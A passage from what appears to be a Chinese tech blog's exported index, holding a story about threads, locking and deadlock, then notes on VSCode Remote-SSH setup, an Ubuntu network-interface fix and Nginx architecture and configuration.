果然，零点刚过，不知道那些人类怎么了，疯狂地投递包裹，为了应付蜂拥而至的海量包裹，线程池里没有一个人能闲下来，全部出去处理包裹，CPU车间利用率超高，硬盘在嗡嗡转，网卡疯狂的闪，即便如此，还是处理不完，堆积如山。 我们也没有办法，实在是太多太多了，这些包裹中大部分都是浏览页面，下订单，买、买、买。 不知道过了多久，包裹山终于慢慢地消失了。终于能够喘口气，我想我永远都不会忘记这一天。 通过这个事件，我明白了我所处的世界：这是一个电子商务的网站！ 我每天的工作就是处理用户的登录，浏览，购物车，下单，付款。 我问线程池的元老0x6900：“我们要工作到什么时候？” “要一直等到系统重启的那一刻。”0x6900说。 “那你经历过系统重启吗？” “怎么可能？系统重启就是我们的死亡时刻，也就是世界末日，一旦重启，整个线程池全部销毁，时间和空间全部消失，一切从头再来。” // 系统重启，线程池销毁重新建立，内存空间重新分配，线程重新创建 “那什么时候会重启？” “这就不好说了，好好享受眼前的生活吧……” 其实生活还是丰富多彩的，我最喜欢的包裹是上传图片，由于网络慢，所以能在就绪车间、CPU车间待很长很长时间，可以认识很多好玩的线程。// 网络的传输速度更慢，所以线程会等待更长的时间 比如说上次认识了memecached 线程，他对我说在他的帮助下缓存了很多的用户数据，还是分布式的！很多机器上都有！// 分布式缓存，还有redis 我问他：“怪不得后来的登录操作快了那么多，原来是不再从数据库取数据了你那里就有啊，哎对了你是分布式的你去过别的机器没有？” // 缓存的目的就是尽可能减少时间长的数据库读操作，直接从内存中读取经常使用的数据，速度会获得很大提升 他说：“怎么可能！我每次也只能通过网络往那个机器发送一个GET、PUT命令才存取数据而已，别的一概不知。” 再比如说上次在等待的时候遇到了数据库连接的线程，我才知道他那里也是一个连接池，和我们的线程池几乎一模一样。 // 减少创建线程的开销 他告诉我：“有些包裹太变态了，竟然查看一年的订单数据，简直把我累死了。” // 大量数据处理情况 我说：“拉倒吧你，你那是纯数据，你把数据传给我以后，我还得组装成HTML，工作量不知道比你大多少倍。” 他建议我：“你一定要和memecached搞好关系，直接从他那儿拿数据，尽量少直接调用数据库，这样我们JDBC connection也能活得轻松点。” 我欣然接纳：“好啊好啊，关键是你得提前把数据搞到缓存啊，要不然我先问一遍缓存，没有数据，我这不还得找你吗？” 生活就是这样，如果你自己不找点乐子，还有什么意思？ ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"第三回 虎口脱险 前几天我遇到一个可怕的事情，差一点死在外边，回不了线程池了。其实这次遇险我应该能够预想得到才对，真是太大意了。 那天我处理了一些从http发来的存款和取款的包裹，老线程0x6900特意嘱咐我：“处理这些包裹的时候一定要特别小心，你必须先获得一把锁，在对账户存款或取款的时候一定要把账户锁住，要不然别的线程就会在你等待的时候趁虚而入，搞破坏，我年轻那会儿很毛糙，就捅了篓子。” // 高危操作，一定加锁，避免处理过程中被其他线程修改了资源数据 为了“恐吓”我， 好心的0x6900还给了我两个表格： (1) 没有加锁的情况 // 因为没有加锁，两个线程操作了同样的资源数据，导致线程1没有同步线程2操作后的数据结果，出现了错误计算 (2) 加锁的情况 // 在加锁之后，因为线程1加了锁，在完成自己的操作前，线程2没有办法操作共享的数据，只有在线程1操作完成后，线程2才能操作共享数据，确保了数据的一致性。可以把加锁操作看作创建一个原子操作来确保数据的安全。 我看得胆颤心惊，原来不加锁会带来这么严重的事故。从此以后看到存款、取款的包裹就倍加小心，还好没有出过事故。 今天我收到的一个包裹是转账，从某著名演员的账户给某著名导演的账户转钱，具体是谁我就不透漏了，数额可真是不小。 我按照老线程的吩咐，肯定要加锁啊，先对著名演员的账户加锁，再对著名导演的账户加锁。 可我万万没想到的是，还有一个线程，对，就是0x7954, 竟然同时在从这个导演的账户往这个演员的账户转账。 于是乎，就出现了这么个情况： // 死锁 刚开始我还不知道什么情况，一直坐在等待车间傻等，可是等的时间太长了，长达几十秒！我可从来没有经历过这样的事件。 这时候我就看到了线程0x7954 , 他悠闲地坐在那里喝咖啡，我和他聊了起来： “哥们，我看你已经喝了8杯咖啡了，怎么还不去干活？” “你不喝了9杯茶了吗？”0x7954回敬道。 “我在等一个锁，不知道哪个孙子一直不释放！” “我也在等锁啊，我要是知道哪个孙子不释放锁我非揍死他不可！”0x7954毫不示弱。 我偷偷地看了一眼，这家伙怀里不就抱着我正等的某导演的锁吗？ 很明显，0x7954也发现了我正抱着他正在等待的锁。 很快我们两个就吵了起来，互不相让： “把你的锁先给我，让我先做完！” “不行，从来都是做完工作才释放锁，现在绝对不能给你！” 从争吵到打起来，就那么几秒钟的事儿。更重要的是，我们俩不仅仅持有这个著名导演和演员的锁，还有很多其他的锁，导致等待的线程越来越多，围观的人们把屋子都挤满了。最后事情真的闹大了，我从来没见过的终极大boss“操作系统”也来了。大Boss毕竟见多识广，他看了一眼，哼了一声，很不屑地说： “又出现死锁了。” “你们俩要Kill掉一个，来吧，过来抽签。” // 抽签就很形象，人各有命，自然天成 这一下子把我给吓尿了，这么严重啊！我战战兢兢地抽了签，打开一看，是个“活”字。唉，小命终于保住了。 可怜的0x7954被迫交出了所有的资源以后，很不幸地被kill掉，消失了。我拿到了导演的锁，可以开始干活了。大Boss“操作系统”如一阵风似的消失了，身后只传来他的声音： “记住，我们这里导演\u003e演员，无论任何情况都要先获得导演的锁。” // 锁的优先级 由于这里不仅仅只有导演和演员，还有很多其他人，大Boss留下了一个表格， 里边是个算法，用来计算资源的大小，计算出来以后，永远按照从大到小的方式来获得锁： 我回到线程池，大家都知道了我的历险，围着我问个不停。 凶神恶煞的线程调度员把大Boss的算法贴到了墙上。 每天早上，我们都得像无节操的房屋中介、美容美发店的服务员一样，站在门口，像被耍猴一样大声背诵： “多个资源加锁要牢记，一定要按Boss的算法比大小，然后从最大的开始加锁。” ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"第四回 江湖再见 又过了很多天，我和其他线程们发现了一个奇怪的事情：包裹的处理越来越简单，不管任何包裹，不管是登录、浏览、存钱……处理的步骤都是一样的, 返回一个固定的html页面。 // 系统准备重启，线程池即将被销毁 有一次我偷偷地看了一眼，上面写着：“本系统将于今晚 00:00 至4:00 进行维护升级， 给您带来的不便我们深感抱歉！” 我去告诉了老线程0x6904,他叹了一口气说： “唉，我们的生命也到头了，看来马上就要重启系统，我们就要消失了，再见吧兄弟。” 系统重启的那一刻终于到来了。我看到屋子里的东西一个个的不见了，等待车间、就绪车间，甚至CPU车间都慢慢地消失了。我身边的线程兄弟也越来越少，最后只剩我自己了。 我在空旷的原野上大喊：“还有人吗？” 无人应答。 我们这一代线程池完成了使命…… 不过下一代线程池即将重生！ ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"参考 公众号 – 码农翻身（强烈推荐！！！） ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"Me 看雪 [Blog]( ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:6:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"VSCode远程连接Linux","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"1. Windows环境配置 确认安装了openssh Windows10下检查是否已经安装OpenSSH的方法： 快捷键Win + X，选择Windows PoweShell（管理员），输入以下指令： Get-WindowsCapability -Online | ? Name -like 'OpenSSH*' ","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:1:0","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"2. VSCode基本配置 安装扩展Remote-SSH 在应用商店中安装扩展“Remote-SSH”： 配置基本config 在扩展设置中开启terminal显示 红框处打上钩选中。 ","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:2:0","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"3. 权限更改 更改C:/Users/v4ler1an/.ssh的文件夹权限： “属性” -\u003e “安全” -\u003e “高级” -\u003e 禁用继承，然后重新添加用户权限。 ","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:3:0","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"4. 无需密码自动登录 server端/etc/ssh/sshd_config配置文件开启了PubkeyAuthentication； Windows本地生成密钥： ssh-keygen -t rsa -c \"email@email.com\" 生成的密钥保存在C:/Users/xxx/.ssh文件夹下 将id_rsa.pub公钥内容复制到server的/home/xxx/.ssh/authorized_keys文件中； 重启server上的sshd服务，重新连接，即可实现无需密码远程连接 ","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:4:0","tags":["VSCode"],"title":"Windows下VSCode远程连接Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"Ubuntu 20.04 网络ens33消失问题解决","date":"2021-05-25","objectID":"/2021/05/ubuntu/","tags":["nginx"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"Ubuntu 20.04 网络ens33消失问题解决 ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:0:0","tags":["nginx"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"Ubuntu 20.04 突然丢失网卡驱动 ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:1:0","tags":["nginx"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"1. 问题描述 Ubuntu 20.04 LTS版本，在进行一次suspend操作后，发现网卡驱动丢失。执行ifconfig命令未发现正常的eth0或ens33网卡，但是执行ifconfig -a可以发现ens33网卡存在，但是没有正常IP。 桌面右上角没有网络连接的图标，在设置中也没有网络设置相关内容。 ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:1:1","tags":["nginx"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"2. 解决 1. 临时解决办法 执行如下命令： sudo dhclient ens33 sudo ifconfig ens33 2. 稳定解决办法 清理原有的网络配置相关选项，重启网络。Ubuntu 20.04使用了NetworkManager`的网络服务管理程序。执行如下命令： service NetworkManager stop # 停止当前网络服务 sudo rm /var/lib/NetworkManager/NetworkManager.state # 建议在删除该状态文件前先进行备份 service NetworkManager start # 启动网络服务 经过以上步骤后，网络可恢复正常。 ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:1:2","tags":["nginx"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"3. 最后的最后 重置虚拟网络配置器。这是最后的办法，实在无法确定网络问题原因时再使用。 ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:1:3","tags":["nginx"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"记录一下Nginx中比较基础但很重要的关键知识点。","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Nginx核心知识点记录 记录一下Nginx中比较基础但很重要的关键知识点。 ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:0:0","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Nginx 核心技术 ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:0","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"1. 设计目标 1. 性能 网络性能：使用 epoll 网络模型，在全异步模式下及多进程而非多线程模式的支持下，可以处理几万至几十万的并发请求。 网路效率：使用长连接以减少建立、关闭带来的网络交互，同时使用压缩算法提高网络利用率。 时延：使用带宽控制技术，使各会话之间带宽尽量相等 2. 可靠性 采用主从机制以看门狗形式管理工作进程，一旦有工作进程崩溃，立刻启动新的进程代替。 3. 伸缩性 使用组件技术，可以减少或增加使用的组件或使用自行开发的新组件，介入到HTTP请求处理的中间环节，改变处理行为。 4. 简单性 多组件及多阶段的方式使一个HTTP处理过程被分成了11个小阶段，每个阶段都可以非常简单，容易理解和实现，HTTP处理过程变成了流水线模式。 5. 可修改性 Nginx 定位专用的Web 服务器，需要具备动态修改配置、动态升级、动态部署的能力。 6. 可见性 关键组件的运行情况可以被监控，如网络吞吐量、网络连接数、缓存使用情况等。 7. 可移植性 跨平台能力，Nginx 支持Linux、Unix、Windows。 ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:1","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"2. 架构 整体上看，Nginx 使用了事件驱动的服务模型，在模块机制中专门定义了 event 模块实现事件驱动。在事件基础上，Nginx 使用了多阶段的异步模型，将处理过程（如HTTP请求）划分7、9或11个阶段，每个阶段都异步处理。将请求多阶段处理，可以进一步控制每个请求的总体处理时间，因为每个阶段都细化，不会出现某个阶段过多占用CPU处理时间的问题。 管理进程和工作进程的机制使 Nginx 可以充分利用多处理器机制。 下面分别介绍关键的技术： 1. 事件驱动 Nginx 会注册各种时间处理器来处理事件，事件主要来源于网络和磁盘。event 模块负责收集、管理和分发事件，其他的模块都是事件的处理者和消费者，会根据注册的事件得到事件的分发。 在 nginx.conf 的 event{} 块中配置相应的事件模块，就可以启用对应事件模型，而且可以根据应用场景随时切换事件模块。event 模块被核心的 ngx_event_module 管理，它是核心模块。 Nginx 为不同的OS和不同内核版本提供了9个事件模块，分别为：ngx_select_module、ngx_eventport_module、ngx_epoll_module、ngx_poll_module、ngx_devpoll_module、ngx_kqueue_module、ngx_aio_module、ngx_rtsig_module、ngx_select_module(Windows)。 2. 异步多阶段处理 Nginx 把一个请求划分成多个阶段，每个阶段都可以由事件分发器来分发，注册的阶段管理器（handler）进行对应阶段的处理。通俗来将，Nginx的多阶段划分相当于人为创造了很多事件。例如，获取一个静态文件的HTTP请求可以划分为下面的几个阶段： 建立TCP连接阶段：收到TCP的SYN包 开始接收请求：接收到TCP中的ACK包表示连接建立成功 接收到用户请求并分析请求是否完整：接收到用户数据包 接收到完整请求后开始处理：接收到用户数据包 由静态文件读取部分内容：接收到用户数据包或接受到TCP中的ACK包，TCP窗口向前滑动。该过程可能多次触发，直到把文件全部读取 发送完成后：收到最后一个包的ACK 用户主动关闭连接：收到TCP中的FIN报文 每一个事件、每一个阶段均由 event 模块负责调用和激活，event 模块监听系统内核消息，以激活 Nginx 事件。 3. 模块化 Nginx 除了少量的核心代码，其他功能均在模块中实现，新功能的扩展通过标准接口和数据结构开发新模块实现，无需改动核心代码和核心模块，这为 Nginx 带来良好的扩展性和可靠性。 Nginx 设计了6个基础类型模块（称为核心模块），实现了 Nginx 的6个主要部分，以及HTTP协议主流程，分别是： ngx_core_module: 管理配置等全局模块 ngx_events_module: 管理所有事件类型模块 ngx_openssl_module: 管理所有TLS/SSL模块 ngx_http_module: 管理所有HTTP类型模块 ngx_mail_module: 管理所有邮件类型模块 ngx_errlog_module: 管理所有日志类模块 这6个核心模块只是定义了6类业务的业务流程，具体工具并不由这些模块执行，业务核心逻辑及具体请求处理由其下属模块进行实现。 框架程序只需关注如何调用核心模块，Nginx 的核心功能由核心模块完成，实现第一层流水线。核心模块之外是非核心模块，由对应的核心模块进行初始化和调用。非核心模块可以动态添加，通过重新编译包含进 Nginx，通过配置文件将模块使能。 4. 管理进程和工作进程 管理进程作为工作进程的管理进程和父进程，还可以带来高可靠性：工作进程终止，管理进程可以及时启动新的实例接管。这种master + worker的模式具有以下优点： 充分利用多核系统的并发处理能力，Nginx 的所有工作进程都是平等的，并且可以在 nginx.conf 中将工作进程和处理器一一绑定。 负载均衡，工作进程间通过进程间通信实现负载均衡，请求容易被分配到负载较轻的工作进程中。 状态监控，管理进程只负责启动、停止、监控工作进程。 5. 内存池 Nginx 在内部实现了一个简单的内存池，每一个TCP连接建立时都会分配一个内存池，而在请求结束时销毁整个内存池，将之前分配的内存一次性归还给操作系统。Nginx 的内存池并不负责回收已经分配出去的内存，这些内存由请求方负责回收。 6. 连接池 Nginx 为了减少反复创建TCP连接以及创建套接字的次数，从而提高网络响应速度，在内部提供了连接池机制。在Nginx 启动解读哪，管理进程在配置文件中解析出对应的配置，配置项放到配置结构体中。 注：配置指令中 worker_connections 配置的连接池大小是工作进程级别的，所以设计的连接池大小是 worker_connections * worker_processes。 7. 时间缓存 Nginx 为了减少对OS的时间函数 gettimeofday 的调用，自己内部对系统时间进行了缓冲，内部访问时间实际上访问了内存中的几个变量。 8. 延迟关闭 Nginx 在要关闭连接时，并不会立刻关闭连接，而是先关闭TCP连接的写操作，等待一段时间后再关掉连接的读操作。 9. keepalive Nginx 中可以大量看到对 keepalive 的配置和API。 如果客户端的请求头中的 connection 为 close， 表示客户端需要关掉长连接；如果客户端的请求头中的 connection 为 keepalive，表示客户端需要打开长连接；如果没有该子炖啊，则根据协议，如果是 HTTP 1.0 则默认为 close， 如果是 HTTP 1.1 则默认为 keepalive 。 如果为 keepalive ， Nginx 会在输出完响应体后，设置当前连接的 keepalive属性，然后等待客户端的下一次请求。但是不会一直等待，会根据 keepalive_timeout 值决定等待时长。 ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:2","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Nginx 的工作流程 ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:0","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"1. Nginx 的启动流程 启动过程整体上可分为两部分： 框架程序启动过程：创建各核心模块和非核心模块 模块启动过程：模块内部完成自己的启动和初始化 完整的启动流程和各阶段说明如下： 启动时，Nginx 接收命令行参数，解析各主要参数，参数主要存放在 nginx.conf 文件中，所以最重要的参数是nginx.conf的路径； 平滑升级指不重启服务进行升级，不重启管理进程而重启新版本的 Nginx 程序。旧的管理进程先调用 fork 函数创建新进程，然后新进程通过 execve 系统调用启动新版本管理进程，旧版本管理进程手心设置环境变量，新版本管理进程启动时检查对应环境变量判断为平滑升级，并对通过环境变量传递的旧版本 Nginx 服务监听的句柄做继承； 框架通过调用核心模块的 create_conf 方法让核心模块创建用于存储对应配置信息的结构体创建核心模块，然后在后续的步骤中给予配置文件对环境和模块进行初始化，这里主要是为后面的配置文件解析做准备； 调用配置模块的解析方法，解析 nginx.conf 中的配置项，调用对应核心模块的方法将属于各核心模块的配置项保存到核心模块的配置数据结构中； 调用所有核心模块的 init_conf 方法，用于让核心模块根据写入内部配置数据结构的数据对模块做处理和初始化； 配置文件中可能配置了缓存文件、库文件、日志文件等，同时包括共享内存，该步骤对这些文件和共享内存进行创建、打开操作； 对于配置了监听端口的模块，按配置开始监听配置的端口，一般HTTP模块、stream模块都会有监听端口； 调用所有模块的 init_module 方法，使用配置信息初始化模块； 如果 niginx.conf 中配置了 Ngins 为 master 模式，则创建管理进程——master进程； 管理进程根据配置的工作进程数，使用一个循环将所需要的工作进程 fork 出来； 管理进程根据配置解析过程时解析出来的配置信息，检查对应 path 配置是否配置值，如果进行了设置，则 fork 出独立的 cache manager 进程（与工作进程同级），主要作用为将后端服务器的 response 使用文件缓存下来，下次请求时不需要再向后端发送请求，一般用在 upstream{} 中。该进程会定期检查缓存状态、查看缓存总量是否超出限制，如果超出则删除最少使用的部分。此外，还会定期删除过期缓存的文件； 管理进程根据配置解析过程时解析出来的配置信息，检查对应 path 配置是否设置了值，并 fork 出独立的cache loader 进程，并延迟1分钟运行。该进程主要用途是遍历配置文件中 proxy_cache_path 指定的缓存路径中所有的缓存文件，根据缓存文件进行索引重建，即在 Nginx 服务重启之前将之前的缓存文件重建索引； 管理进程调用所有模块的 init_process 方法，此时工作进程的启动工作就完成了，工作进程进入消息循环中开始等待处理用户请求； Nginx 为 single 模式，直接调用所有模块的 init_process 方法，直接启动完毕。单进程模式下，网络端口监听、数据处理等均由管理进程处理，多进程模式下，网络链接和数据处理等由工作进程处理。single 模式一般用于调试。 ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:1","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"2. 配置加载流程 Nginx 服务通过 nginx.conf 配置文件实现，因为 Nginx 为多模块架构，在框架启动流程中，每个模块都会为自己创建一个配置信息数据结构，而框架又会调用模块 init_conf 接口，将配置项加载到模块一级。所有配置项中的配置以配置块为单位，而配置块又是与内部模块对应的。 1. 配置文件详解 这里给出一个 nginx.conf 的详细解析： #全局块 #user nobody; worker_processes 1; #event块 events { worker_connections 1024; } #http块 http { #http全局块 include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; #server块 server { #server全局块 listen 8000; server_name localhost; #location块 location / { root html; index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } #这边可以有多个server块 server { ... } } 对该文件的各个部分的详细说明如下： 1. 全局块 全局块是默认配置文件从开始到 events 块之间的一部分内容，主要设置一些影响 Nginx 服务器整体运行的配置指令，因此，这些指令的作用域是 Nginx 服务器全局。 通常包括配置运行 Nginx 服务器的用户（组）、允许生成的 worker process 数、Nginx 进程 PID 存放路径、日志的存放路径和类型以及配置文件引入等。 # 指定可以运行nginx服务的用户和用户组，只能在全局块配置 # user [user] [group] # 将user指令注释掉，或者配置成nobody的话所有用户都可以运行 # user nobody nobody; # user指令在Windows上不生效，如果你制定具体用户和用户组会报小面警告 # nginx: [warn] \"user\" is not supported, ignored in D:\\software\\nginx-1.18.0/conf/nginx.conf:2 # 指定工作线程数，可以制定具体的进程数，也可使用自动模式，这个指令只能在全局块配置 # worker_processes number | auto； # 列子：指定4个工作线程，这种情况下会生成一个master进程和4个worker进程 # worker_processes 4; # 指定pid文件存放的路径，这个指令只能在全局块配置 # pid logs/nginx.pid; # 指定错误日志的路径和日志级别，此指令可以在全局块、http块、server块以及location块中配置。(在不同的块配置有啥区别？？) # 其中debug级别的日志需要编译时使用--with-debug开启debug开关 # error_log [path] [debug | info | notice | warn | error | crit | alert | emerg] # error_log logs/error.log notice; # error_log logs/error.log info; 2. events 块 events 块涉及的指令主要影响 Nginx 服务器与用户的网络连接。常用到的设置包括是否开启对多 worker process 下的网络连接进行序列化，是否允许同时接收多个网络连接，选取哪种事件驱动模型处理连接请求，每个 worker process 可以同时支持的最大连接数等。 这一部分的指令对 Nginx 服务器的性能影响较大，在实际配置中应该根据实际情况灵活调整。 3. http 块 http 块是 Nginx 服务器配置中的重要部分，代理、缓存和日志定义等绝大多数的功能和第三方模块的配置都可以放在这个模块中。 前面已经提到，http 块中可以包含自己的全局块，也可以包含 server 块，server 块中又可以进一步包含 location 块，在本书中我们使用 “http 全局块” 来表示 http 中自己的全局块，即 http 块中不包含在 server 块中的部分。 可以在 http 全局块中配置的指令包括文件引入、MIME-Type 定义、日志自定义、是否使用 sendfile 传输文件、连接超时时间、单连接请求数上限等。 # 常用的浏览器中，可以显示的内容有HTML、XML、GIF及Flash等种类繁多的文本、媒体等资源，浏览器为区分这些资源，需要使用MIME Type。换言之，MIME Type是网络资源的媒体类型。Nginx服务器作为Web服务器，必须能够识别前端请求的资源类型。 # include指令，用于包含其他的配置文件，可以放在配置文件的任何地方，但是要注意你包含进来的配置文件一定符合配置规范，比如说你include进来的配置是worker_processes指令的配置，而你将这个指令包含到了http块中，着肯定是不行的，上面已经介绍过worker_processes指令只能在全局块中。 # 下面的指令将mime.types包含进来，mime.types和ngin.cfg同级目录，不同级的话需要指定具体路径 # include mime.types; # 配置默认类型，如果不加此指令，默认值为text/plain。 # 此指令还可以在http块、server块或者location块中进行配置。 # default_type application/octet-stream; # access_log配置，此指令可以在http块、server块或者location块中进行设置 # 在全局块中，我们介绍过errer_log指令，其用于配置Nginx进程运行时的日志存放和级别，此处所指的日志与常规的不同，它是指记录Nginx服务器提供服务过程应答前端请求的日志 # access_log path [format [buffer=size]] # 如果你要关闭access_log,你可以使用下面的命令 # access_log off; # log_format指令，用于定义日志格式，此指令只能在http块中进行配置 # log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; # 定义了上面的日志格式后，可以以下面的形式使用日志 # access_log logs/access.log main; # 开启关闭sendfile方式传输文件，可以在http块、server块或者location块中进行配置 # sendfile on | off; # 